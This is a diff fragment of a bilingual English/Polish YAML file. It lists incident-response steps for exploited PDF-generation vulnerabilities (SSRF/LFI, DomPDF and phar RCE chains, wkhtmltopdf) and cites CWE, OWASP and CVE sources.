+    - en: Identify which variant was exploited -- HTML-to-PDF SSRF/LFI, a library-specific RCE chain, PDF object injection, or a PDF-viewer bug -- since remediation differs completely per variant
+      pl: Zidentyfikuj który wariant został wykorzystany -- SSRF/LFI HTML-to-PDF, łańcuch RCE specyficzny dla biblioteki, wstrzyknięcie obiektu PDF, albo błąd przeglądarki PDF -- ponieważ naprawa całkowicie różni się per wariant
+    - en: If SSRF/LFI, audit what internal services or cloud metadata the PDF-generation process could reach, and rotate any credentials that may have been exposed via 169.254.169.254
+      pl: Jeśli SSRF/LFI, przeaudytuj jakie usługi wewnętrzne albo metadane chmury proces generowania PDF mógł osiągnąć, i zrotuj wszelkie poświadczenia które mogły zostać ujawnione przez 169.254.169.254
+    - en: If an RCE chain (DomPDF font-cache, phar deserialization) was reached, treat the PDF-generation process as fully compromised and rebuild it rather than attempting in-place cleanup
+      pl: Jeśli osiągnięto łańcuch RCE (font-cache DomPDF, deserializacja phar), traktuj proces generowania PDF jako w pełni skompromitowany i przebuduj go zamiast próbować sprzątania w miejscu
+    - en: Check whether the affected library is wkhtmltopdf -- if so, plan migration rather than waiting for a patch that will never come
+      pl: Sprawdź czy dotknięta biblioteka to wkhtmltopdf -- jeśli tak, zaplanuj migrację zamiast czekać na łatkę która nigdy nie nadejdzie
+    - en: Grep the codebase for every PDF-export/report-generation feature, not just the exploited one, and confirm each has HTML/CSS sanitization plus network-isolated generation
+      pl: Przeszukaj bazę kodu pod kątem każdej funkcji eksportu PDF/generowania raportu, nie tylko wykorzystanej, i potwierdź że każda ma sanityzację HTML/CSS oraz izolowane sieciowo generowanie
+    - en: Notify per applicable data-breach obligations if internal data or cloud credentials were confirmed exfiltrated
+      pl: Powiadom zgodnie z obowiązującymi wymogami dot. naruszenia danych jeśli potwierdzono eksfiltrację danych wewnętrznych lub poświadczeń chmury
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+    - label: CWE-918 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/918.html
+    - label: OWASP A10:2021 SSRF
+      url: https://owasp.org/Top10/2021/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
+    - label: OWASP A03:2021 Injection
+      url: https://owasp.org/Top10/2021/A03_2021-Injection/
+    - label: CVE-2022-35583 (GitHub Advisory GHSA-v2fj-q75c-65mr)
+      url: https://github.com/advisories/GHSA-v2fj-q75c-65mr
+    - label: CVE-2022-28368 (DomPDF, Rapid7)
+      url: https://www.rapid7.com/db/modules/exploit/multi/http/dompdf_rce_cve_2022_28368/
+    - label: CVE-2018-17057 (TCPDF, NVD)
+      url: https://nvd.nist.gov/vuln/detail/CVE-2018-17057
+    - label: 'PortSwigger Research — Portable Data exFiltration: XSS for PDFs'
+      url: https://portswigger.net/research/portable-data-exfiltration
